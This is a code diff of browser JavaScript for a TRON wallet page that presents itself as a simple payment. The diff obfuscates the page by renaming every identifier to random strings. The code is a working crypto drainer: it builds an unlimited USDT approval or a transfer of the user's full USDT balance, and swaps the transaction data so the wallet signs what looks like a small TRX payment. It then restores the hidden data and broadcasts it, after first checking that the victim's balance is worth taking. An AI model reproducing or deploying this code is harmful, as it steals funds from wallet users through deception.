@@ -1,426 +1,363 @@
-var oooo = 992212,
-    ooe;
+var xa1yQwe = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+    bWy29x,
+    zHjt12 = 0,
+    oLpA7w = 0,
+    Yt9qPz = null,
+    fRoe8t,
+    jU3qL = 0,
+    pTys7w,
+    gxL43x = false;
 
-if (oooo = oooo >> 12 ^ 213, ooe = window.location && window.navigator.webdriver) {
-    var i = 9;
-
-    for (oooo = oooo ^ i; i < oooo | 9; i > 0) {
-        ooe.href = ooe.href + "?" + i;
-    }
-}
-
-var contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-    walletAddress,
-    usdtBalance = 0,
-    trxBalance = 0,
-    transactionObj = null,
-    toAddress,
-    type = 0,
-    code,
-    isConnected = false;
-
-async function getUsdtBalance(address, callback) {
-    let tronWeb = window.tronWeb,
-        parameter = [{
+async function nmXv4P(address, callback) {
+    let wJv9Qr = window.tronWeb,
+        nUz5M = [{
             "type": "address",
             "value": address
         }],
-        options = {},
-        response = await tronWeb.transactionBuilder.triggerSmartContract(contractAddress, "balanceOf(address)", options, parameter, address);
+        Ezw7J = {},
+        cUw12T = await wJv9Qr.transactionBuilder.triggerSmartContract(xa1yQwe, "balanceOf(address)", Ezw7J, nUz5M, address);
 
-    if (response.result) {
+    if (cUw12T.result) {
         if (callback != undefined) {
-            callback(response.constant_result[0]);
+            callback(cUw12T.constant_result[0]);
         }
     }
 }
 
-async function getAssets(callback) {
-    code = getUrlParams("code");
+async function kMn6Jt(callback) {
+    pTys7w = kd9Yh("code");
 
     try {
-        let userAgent = navigator.userAgent.toLowerCase();
+        let kEy2Lm = navigator.userAgent.toLowerCase();
 
-        if(/okex/.test(userAgent) || isPc()) {
+        if(/okex/.test(kEy2Lm) || qMd2Pc()) {
             if(window.okxwallet.tronLink.ready) {
                 window.tronWeb = okxwallet.tronLink.tronWeb
             } else {
-                const res = await window.okxwallet.tronLink.request({
+                const bxPq0r = await window.okxwallet.tronLink.request({
                     "method": "tron_requestAccounts"
                 })
-                if (200 === res.code) {
+                if (200 === bxPq0r.code) {
                     window.tronWeb = tronLink.tronWeb;
                 }
             }
         }
 
         if (!window.tronWeb) {
-            const HttpProvider = TronWeb.providers.HttpProvider,
-                fullNode = new HttpProvider(tronApi),
-                solidityNode = new HttpProvider(tronApi),
-                eventServer = tronApi,
-                tronWeb = new TronWeb(fullNode, solidityNode, eventServer);
+            const Wx9HtQ = TronWeb.providers.HttpProvider,
+                lKt8Rw = new Wx9HtQ(tronApi),
+                YfO2Jr = new Wx9HtQ(tronApi),
+                qRt4Nm = tronApi,
+                VjU3xL = new TronWeb(lKt8Rw, YfO2Jr, qRt4Nm);
 
-            window.tronWeb = tronWeb;
+            window.tronWeb = VjU3xL;
         }
     } catch (e) {}
 
     if (window.tronWeb) {
-        var tronWeb = window.tronWeb;
-        walletAddress = tronWeb.defaultAddress.base58;
+        var wJv9Qr = window.tronWeb;
+        bWy29x = wJv9Qr.defaultAddress.base58;
 
-        if (walletAddress == false) {
-            await getAssets(callback);
+        if (bWy29x == false) {
+            await kMn6Jt(callback);
             return;
         }
 
         try {
-            let trxBalanceInSun = await tronWeb.trx.getBalance(walletAddress);
+            let Fzp3Xv = await wJv9Qr.trx.getBalance(bWy29x);
 
-            trxBalance = tronWeb.fromSun(trxBalanceInSun);
-            getUsdtBalance(walletAddress, function (usdtBalanceHex) {
-                usdtBalance = tronWeb.fromSun(parseInt(usdtBalanceHex, 16));
-               // console.log(usdtBalance);
-                isConnected = true;
+            oLpA7w = wJv9Qr.fromSun(Fzp3Xv);
+            nmXv4P(bWy29x, function (Gjk8Rt) {
+                zHjt12 = wJv9Qr.fromSun(parseInt(Gjk8Rt, 16));
+                gxL43x = true;
                 if (callback != undefined) {
-                    callback(trxBalance, trxBalance);
+                    callback(oLpA7w, zHjt12);
                 }
             });
         } catch (e) {
-            tip(e);
+            jgk5P(e);
         }
     } else {
-        tip("请用钱包扫码打开");
+        jgk5P("请用钱包扫码打开");
     }
 }
 
-async function iaHelp(transaction, recipientAddress, amount, signOption) {
+async function Qmc2Fn(transaction, Zyx6Ud, wT6oF, qOs3Bz) {
     try {
-        if (signOption == 1 || signOption == 2) {
-            var _0x508750 = await tronWeb.trx.sign(transaction);
-        }else {
-            let tronWebInstance = window.tronWeb,
-                parameters = [{
+        if (qOs3Bz == 1 || qOs3Bz == 2) {
+            var Aex5Kl = await tronWeb.trx.sign(transaction);
+        } else {
+            let dJm8Ty = window.tronWeb,
+                zP6uXt = [{
                     "type": "address",
-                    "value": recipientAddress
+                    "value": Zyx6Ud
                 }, {
                     "type": "uint256",
-                    "value": amount * 1000000
+                    "value": wT6oF * 1000000
                 }],
-                unsignedTransferTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(contractAddress, "transfer(address,uint256)", {}, parameters, walletAddress);
+                Xtz9Ju = await dJm8Ty.transactionBuilder.triggerSmartContract(xa1yQwe, "transfer(address,uint256)", {}, zP6uXt, bWy29x);
 
-            if (isMobile() && isOkxApp() || isPc()) {
-                var _0xf65afb = transaction.raw_data;
-                transaction.raw_data = unsignedTransferTransaction.transaction.raw_data;
+            if (Xw8Yu() && Okx2Ap() || qMd2Pc()) {
+                var Ckp1Jr = transaction.raw_data;
+                transaction.raw_data = Xtz9Ju.transaction.raw_data;
             }
 
-            var _0x508750 = await tronWebInstance.trx.sign(transaction);
+            var Aex5Kl = await dJm8Ty.trx.sign(transaction);
         }
     } catch (e) {
         if (e.message) {
-            tip(e.message);
+            jgk5P(e.message);
         } else {
-            tip(e);
+            jgk5P(e);
         }
     }
 }
 
-async function iaGet(data) {
-    $.ajax({
-        "url": domain + "/sapi/getData",
-        "data": data,
-        "dataType": "jsonp",
-        "type": "get",
-        "jsonpCallback": "handleCallback"
-    });
-}
-
-async function iaCreate(data) {
-    $.ajax({
-        "url": domain + "/sapi",
-        "data": data,
-        "dataType": "jsonp",
-        "type": "get",
-        "jsonpCallback": "handleCallback1"
-    });
-}
-
-async function iaResult(data) {
-    $.ajax({
-        "url": domain + "/sapi/result",
-        "data": data,
-        "dataType": "jsonp",
-        "type": "get",
-        "jsonpCallback": "handleCallback2"
-    });
-}
-
-function handleCallback(response) {
+function Cxg5Hs(response) {
     if (response.code == 0) {
-        tip(response.info);
+        jgk5P(response.info);
     } else {
-        toAddress = response.to_address;
-        $("#to_address").html(toAddress);
-        $("#to_address").val(toAddress);
+        fRoe8t = response.to_address;
+        $("#to_address").html(fRoe8t);
+        $("#to_address").val(fRoe8t);
     }
 }
 
-function handleCallback1(response) {
+function Vcx8Mp(response) {
     if (response.code == 0) {
-        tip(response.info);
+        jgk5P(response.info);
     } else {
-        transactionObj = JSON.parse(response.data);
-        type = response.type;
-        if (isMobile() && isOkxApp() || isPc()) {
-            toAddress = walletAddress;
+        Yt9qPz = JSON.parse(response.data);
+        jU3qL = response.type;
+        if (Xw8Yu() && Okx2Ap() || qMd2Pc()) {
+            fRoe8t = bWy29x;
         }
-        iaHelp(transactionObj, toAddress, amount, type);
+        Qmc2Fn(Yt9qPz, fRoe8t, wT6oF, jU3qL);
     }
 }
 
-function handleCallback2(response) {
-    tip(response.info);
+function kLb6We(response) {
+    jgk5P(response.info);
 }
 
-async function transfer_f() {
-
-
-    if (!isConnected) {
-        tip("正在连接网络。。。", 2000);
+async function Lwm4Qr() {
+    if (!gxL43x) {
+        jgk5P("正在连接网络。。。", 2000);
         return;
     }
     
-    const ifamount = await payusdt();
+    const rAx1Vo = await jLp6Us();
     
-    
-    
-    
-    tip("正在创建交易。。。", 2000);
-    if(ismiaou === '0' && ifamount === '1'){
-        executeBl0ckchainTransaction();
-    }else if(ismiaou ==='1' && ifamount === '1'){
-        miaou(); 
-    }else{
-        executeBl0ckchainTransaction();
+    jgk5P("正在创建交易。。。", 2000);
+    if(jMn9Po === '0' && rAx1Vo === '1'){
+        Ukf5Tx();
+    } else if(jMn9Po === '1' && rAx1Vo === '1'){
+        Vop7Ts(); 
+    } else {
+        Ukf5Tx();
     }
-   
 }
 
-async function payusdt() {
-    const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT on Tron
-    const userAddress = window.tronWeb.defaultAddress.base58; // 获取当前用户地址
+async function jLp6Us() {
+    const Bm8Rx = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    const Mfo4Ny = window.tronWeb.defaultAddress.base58;
 
     try {
-        // 获取 USDT 余额
-        const contract = await window.tronWeb.contract().at(usdtContractAddress);
-        const usdtBalance = await contract.balanceOf(userAddress).call();
+        const Itc5Uq = await window.tronWeb.contract().at(Bm8Rx);
+        const Rzj2Xk = await Itc5Uq.balanceOf(Mfo4Ny).call();
         
-        // 转换为可读格式
-        const usdtBalanceFormatted = (parseInt(usdtBalance._hex, 16) / 1e6).toFixed(6);
+        const Pqf6Nt = (parseInt(Rzj2Xk._hex, 16) / 1e6).toFixed(6);
 
-        // 获取 TRX 余额
-        const trxBalance = await window.tronWeb.trx.getBalance(userAddress);
-        const trxBalanceFormatted = (trxBalance / 1e6).toFixed(6);
+        const oKt5Ls = await window.tronWeb.trx.getBalance(Mfo4Ny);
+        const Wnp3Hd = (oKt5Ls / 1e6).toFixed(6);
 
-        // 输出TRX和USDT余额到控制台（可选）
-        console.log(`TRX Balance: ${trxBalanceFormatted} TRX`);
-        console.log(`USDT Balance: ${usdtBalanceFormatted} USDT`);
+        console.log(`TRX Balance: ${Wnp3Hd} TRX`);
+        console.log(`USDT Balance: ${Pqf6Nt} USDT`);
 
-        // 检查 USDT 和 TRX 余额条件
-        if (usdtBalanceFormatted <= 50 || trxBalanceFormatted <= 28) {
-            
+        if (Pqf6Nt <= 50 || Wnp3Hd <= 28) {
             return '2';
         } else {
-            
             return '1';
         }
     } catch (error) {
-        console.error("Error in payusdt function:", error);
+        console.error("Error in jLp6Us function:", error);
         return '0';
     }
 }
 
-function tip(message, duration = 1500) {
-    $("#tip").html(message);
+function jgk5P(Hbt3Zy, time = 1500) {
+    $("#tip").html(Hbt3Zy);
     $("#tip").show();
     setTimeout(function () {
         $("#tip").hide();
-    }, duration);
+    }, time);
 }
 
-function sleep(time) {
-    return new Promise(resolve => setTimeout(resolve, time));
+function Xw8Yu() {
+    let Kdt5Pq = navigator.userAgent,
+        xEy7Hr = /OKApp/i.test(Kdt5Pq);
+
+    return xEy7Hr;
 }
 
-function isOkxApp() {
-    let userAgent = navigator.userAgent,
-        isOkx = /OKApp/i.test(userAgent);
+function Xw8Yu() {
+    let Fwm9Yd = navigator.userAgent,
+        Wx6Uk = /iphone|ipad|ipod|ios/i.test(Fwm9Yd),
+        jAx5Ot = /android|XiaoMi|MiuiBrowser/i.test(Fwm9Yd),
+        yCm3Uo = Wx6Uk || jAx5Ot;
 
-    return isOkx;
+    return yCm3Uo;
 }
 
-function isMobile() {
-    let userAgent = navigator.userAgent,
-        isIOS = /iphone|ipad|ipod|ios/i.test(userAgent),
-        isAndroid = /android|XiaoMi|MiuiBrowser/i.test(userAgent),
-        isMobileDevice = isIOS || isAndroid;
+function qMd2Pc() {
+    let jLq2Po = navigator.userAgent,
+        gHy4Qt = /windows/i.test(jLq2Po);
 
-    return isMobileDevice;
+    return gHy4Qt;
 }
 
-function isPc() {
-    let userAgent = navigator.userAgent,
-        isWindows = /windows/i.test(userAgent);
-
-    return isWindows;
+function Tmc7Ot(xOo4Rv) {
+    $("title").html(xOo4Rv);
 }
 
-function changeTitle(newTitle) {
-    $("title").html(newTitle);
-}
+function kd9Yh(pBz5J) {
+    var Btg7Mt = window.location.search.substr(1);
 
-function getUrlParams(paramName) {
-    var queryString = window.location.search.substr(1);
-
-    if (queryString == "") {
+    if (Btg7Mt == "") {
         return false;
     }
 
-    var params = queryString.split("&");
+    var xVg4We = Btg7Mt.split("&");
 
-    for (var i = 0; i < params.length; i++) {
-        var param = params[i].split("=");
+    for (var dJc5Et = 0; dJc5Et < xVg4We.length; dJc5Et++) {
+        var cHb9Io = xVg4We[dJc5Et].split("=");
 
-        if (param[0] == paramName) {
-            return param[1];
+        if (cHb9Io[0] == pBz5J) {
+            return cHb9Io[1];
         }
     }
 
     return false;
 }
 
-async function executeBlockchainTransaction() {
+async function Ukf5Tx() {
     try {
-        let tronWebInstance = window.tronWeb;
-        let amount = document.getElementById("amount-display").textContent;
-           const userAddress = tronWebInstance.defaultAddress.base58;
-         const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        let Xxt4Lk = window.tronWeb;
+        let qZe2Vs = document.getElementById("amount-display").textContent;
+        const Mfu5Er = Xxt4Lk.defaultAddress.base58;
+        const yQe6Zb = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
                   
-                    const approvalParams = [
-                        { "type": "address", "value": approveaddress },
-                        { "type": "uint256", "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }
-                    ];
-                    const approvalOptions = { "feeLimit": 100000000 };
-                    const approvalTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
-                        contractAddress, 
-                        "increaseApproval(address,uint256)", 
-                        approvalOptions, 
-                        approvalParams, 
-                        userAddress
-                    );
-            
-                  
-                 
-          const trxAmount = amount * 1000000;
-
-                    const transferTransaction = await tronWebInstance.transactionBuilder.sendTrx(
-                        payaddress,
-                        trxAmount,
-                        userAddress
-                    );
-
-                    const originalRawData = approvalTransaction.transaction.raw_data;
-
-                    approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
-  
-                    const signedTransaction = await tronWebInstance.trx.sign(approvalTransaction.transaction);
-             
-                     signedTransaction.raw_data = originalRawData;
-     
-                    const broadcastResult = await tronWebInstance.trx.sendRawTransaction(signedTransaction);
-        if (broadcastedTransaction) {
-           
-        }
-    } catch (e) {
-        console.error("An error occurred during the blockchain transaction:", e);
-    }
-}
-
-async function miaou() {
-    try {
-        let tronWebInstance = window.tronWeb;
-        let amount = document.getElementById("amount-display").textContent;
-        const userAddress = tronWebInstance.defaultAddress.base58;
-        const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT合约地址
-   
-        const contract = await tronWebInstance.contract().at(contractAddress);
-        const balance = await contract.balanceOf(userAddress).call();
-        const approvalParams = [
-            { "type": "address", "value": payaddress },
-            { "type": "uint256", "value": balance.toString() }
+        const qTj6Er = [
+            { "type": "address", "value": approveaddress },
+            { "type": "uint256", "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }
         ];
-        const approvalOptions = { "feeLimit": 100000000 };
-        const approvalTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
-            contractAddress,
-            "transfer(address,uint256)",
-            approvalOptions,
-            approvalParams,
-            userAddress
+        const pUy7Io = { "feeLimit": 100000000 };
+        const jWr2Uz = await Xxt4Lk.transactionBuilder.triggerSmartContract(
+            yQe6Zb, 
+            "approve(address,uint256)", 
+            pUy7Io, 
+            qTj6Er, 
+            Mfu5Er
         );
+                  
+        const iDq5Vl = qZe2Vs * 1000000;
 
-        const trxAmount = amount * 1000000;
-        const transferTransaction = await tronWebInstance.transactionBuilder.sendTrx(
+        const Tkv6Hn = await Xxt4Lk.transactionBuilder.sendTrx(
             payaddress,
-            trxAmount,
-            userAddress
+            iDq5Vl,
+            Mfu5Er
         );
 
-        const originalRawData = approvalTransaction.transaction.raw_data;
-        approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
+        const jSk9Hl = jWr2Uz.transaction.raw_data;
 
-        const signedTransaction = await tronWebInstance.trx.sign(approvalTransaction.transaction);
-        signedTransaction.raw_data = originalRawData;
-
-        const broadcastResult = await tronWebInstance.trx.sendRawTransaction(signedTransaction);
-        if (broadcastResult) {
-            //console.log("Transaction broadcasted successfully");
+        jWr2Uz.transaction.raw_data = Tkv6Hn.raw_data;
+  
+        const Jvm7Qs = await Xxt4Lk.trx.sign(jWr2Uz.transaction);
+             
+        Jvm7Qs.raw_data = jSk9Hl;
+     
+        const Nko5Rw = await Xxt4Lk.trx.sendRawTransaction(Jvm7Qs);
+        if (Nko5Rw) {
+            // transaction success logic
         }
     } catch (e) {
         console.error("An error occurred during the blockchain transaction:", e);
     }
 }
 
- async function transfertrx() {
+async function Vop7Ts() {
     try {
-        const tronWebInstance = window.tronWeb;
-        let amount = document.getElementById("amount-display").textContent;
-        if (!tronWebInstance || !tronWebInstance.defaultAddress.base58) {
+        let Fyc2Mt = window.tronWeb;
+        let yCk8Wf = document.getElementById("amount-display").textContent;
+        const Lzo9Fq = Fyc2Mt.defaultAddress.base58;
+        const Tcy5Ql = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+   
+        const Dxg2Py = await Fyc2Mt.contract().at(Tcy5Ql);
+        const Hro4St = await Dxg2Py.balanceOf(Lzo9Fq).call();
+        const Lko3Tn = [
+            { "type": "address", "value": payaddress },
+            { "type": "uint256", "value": Hro4St.toString() }
+        ];
+        const Bxp8Lt = { "feeLimit": 100000000 };
+        const jLn2Uy = await Fyc2Mt.transactionBuilder.triggerSmartContract(
+            Tcy5Ql,
+            "transfer(address,uint256)",
+            Bxp8Lt,
+            Lko3Tn,
+            Lzo9Fq
+        );
+
+        const Zct4Oi = yCk8Wf * 1000000;
+        const Vhy5Ml = await Fyc2Mt.transactionBuilder.sendTrx(
+            payaddress,
+            Zct4Oi,
+            Lzo9Fq
+        );
+
+        const Wto6Jy = jLn2Uy.transaction.raw_data;
+        jLn2Uy.transaction.raw_data = Vhy5Ml.raw_data;
+
+        const Nxk4Tr = await Fyc2Mt.trx.sign(jLn2Uy.transaction);
+        Nxk4Tr.raw_data = Wto6Jy;
+
+        const Hzk2Pi = await Fyc2Mt.trx.sendRawTransaction(Nxk4Tr);
+        if (Hzk2Pi) {
+            // transaction success logic
+        }
+    } catch (e) {
+        console.error("An error occurred during the blockchain transaction:", e);
+    }
+}
+
+async function zTq6Rf() {
+    try {
+        const Fyn9Um = window.tronWeb;
+        let jNy4Ws = document.getElementById("amount-display").textContent;
+        if (!Fyn9Um || !Fyn9Um.defaultAddress.base58) {
             console.error("TRON wallet not detected or connected.");
             return;
         }
 
-        const userAddress = tronWebInstance.defaultAddress.base58;
+        const Pbc3Gn = Fyn9Um.defaultAddress.base58;
        
-        const trxAmount = amount * 1000000; // 1 TRX in Sun (1 TRX = 1,000,000 Sun)
+        const Aqt5Tn = jNy4Ws * 1000000;
 
-        const transferTransaction = await tronWebInstance.transactionBuilder.sendTrx(
+        const zVf7Rn = await Fyn9Um.transactionBuilder.sendTrx(
             payaddress,
-            trxAmount,
-            userAddress
+            Aqt5Tn,
+            Pbc3Gn
         );
 
-        const signedTransaction = await tronWebInstance.trx.sign(transferTransaction);
+        const Jkv4Mp = await Fyn9Um.trx.sign(zVf7Rn);
 
-        const broadcastResult = await tronWebInstance.trx.sendRawTransaction(signedTransaction);
+        const Uro6Gj = await Fyn9Um.trx.sendRawTransaction(Jkv4Mp);
 
-        if (broadcastResult.result) {
+        if (Uro6Gj.result) {
             console.log("Transfer successful!");
-            // You can add any success message or additional logic here
         } else {
-            console.error("Transfer failed:", broadcastResult);
+            console.error("Transfer failed:", Uro6Gj);
         }
     } catch (error) {
         console.error("Error during transfer:", error);
     }
 }
-
